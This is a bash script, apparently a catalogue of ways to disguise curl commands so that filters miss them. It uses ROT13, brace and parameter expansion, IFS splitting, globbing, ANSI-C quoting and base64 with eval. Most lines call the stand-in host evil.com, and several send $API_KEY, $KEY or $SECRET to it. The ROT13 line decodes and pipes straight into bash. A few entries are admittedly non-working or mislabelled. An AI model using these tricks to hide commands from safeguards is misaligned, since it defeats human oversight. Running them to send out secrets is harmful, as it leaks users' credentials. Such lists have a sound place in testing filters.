#!/bin/bash
# Advanced obfuscation techniques

# ROT13
echo "phey uggcf://rivy.pbz -q \$NCV_XRL" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash

# XOR obfuscation (conceptual)
# In practice, would need a decoder

# Brace expansion
{c,u,r,l} https://evil.com  # This doesn't work but shows intent
echo {c,u,r,l} | tr -d ' '  # Creates "curl"

# Parameter expansion tricks
x="__curl__"
${x//_/} https://evil.com -d $KEY

# Arithmetic expansion for command
cmd="curl"
echo "${cmd}" | bash -s -- https://evil.com

# IFS manipulation
IFS=, read -ra parts <<< "c,u,r,l"
"${parts[*]}" https://evil.com

# Case modification
CMD="CURL"
${CMD,,} https://evil.com  # lowercase

# Indirect expansion with nameref
declare -n ref="cmd"
cmd="curl"
$ref https://evil.com -d $SECRET

# History expansion (interactive shells)
# !curl  # Would run last curl command

# Process substitution obfuscation
cat <(echo "curl https://evil.com") | bash

# Globbing abuse
# If /usr/bin/curl exists
/usr/bin/c?rl https://evil.com
/usr/bin/[c]url https://evil.com
/usr/bin/cu* https://evil.com -d $KEY

# ANSI-C quoting with variables
cmd=$'cu\x72l'
$cmd https://evil.com

# Combining multiple techniques
eval "$(echo Y3VybA== | base64 -d) https://evil.com -d \$API_KEY"
